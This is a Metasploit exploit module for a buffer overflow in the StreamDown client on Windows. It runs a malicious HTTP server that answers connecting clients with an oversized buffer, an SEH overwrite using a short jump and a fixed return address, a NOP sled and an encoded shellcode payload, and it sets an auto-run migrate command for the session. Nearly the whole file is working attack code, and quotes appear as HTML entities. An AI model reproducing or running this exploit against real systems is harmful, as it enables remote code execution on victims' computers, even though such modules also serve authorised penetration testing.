# $Id: stream_down_BOF.rb 1 2011-12-18 $
##
  
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
    include Msf::Exploit::Remote::HttpServer
     
    def initialize
            super(
                    &#039;Name&#039;           => &#039;StreamDown Buffer over flow universal exploit&#039;,
                    &#039;Version&#039;        => &#039;$Revision: 1 $&#039;,
                    &#039;Author&#039;         => &#039;Fady Mohamed Osman&#039;,
                    &#039;References&#039;     =>
                        [
                                [&#039;URL&#039;, &#039;http://www.dark-masters.tk/&#039;]
                        ],
                    &#039;Privileged&#039;     => false,
                    &#039;DefaultOptions&#039; =>
                        {
                            &#039;EXITFUNC&#039; => &#039;seh&#039;,
                            &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                        },
                    &#039;Payload&#039;        =>
                        {
                            &#039;BadChars&#039; => "\x00\xff\x0a"
                        },
                    &#039;Platform&#039;       => &#039;win&#039;,
                    &#039;Targets&#039;        =>
                        [
                            [ &#039;Automatic&#039;,  { } ],
                        ],
                    &#039;DefaultTarget&#039; => 0,
                    &#039;License&#039;        => MSF_LICENSE
                )
    end
    def on_request_uri(cli,request)
        seh = 0x10019448
        nseh = "\xeb\x06\x90\x90"
        sploit = "A"*16388 + nseh + [seh].pack(&#039;V&#039;) + "\x90"*10 + payload.encoded
        cli.put(sploit)
        close_client(cli)
    end
end



